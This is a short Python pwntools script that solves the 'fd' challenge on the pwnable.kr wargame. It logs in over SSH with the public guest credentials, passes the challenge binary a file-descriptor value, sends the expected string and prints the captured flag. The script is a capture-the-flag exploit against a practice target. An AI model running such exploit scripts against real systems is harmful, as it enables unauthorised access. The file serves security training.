from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "fd"
REMOTE_PASSWORD = "guest"

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
sh = shell.run("/bin/sh")

sh.sendline("./fd 4660".encode())
sh.sendline("LETMEWIN".encode())

# recv "good job :)"
sh.recvline()

# recv flag
flag = sh.recvline().decode().strip()

sh.close()
shell.close()

print(f'Flag is: {flag}')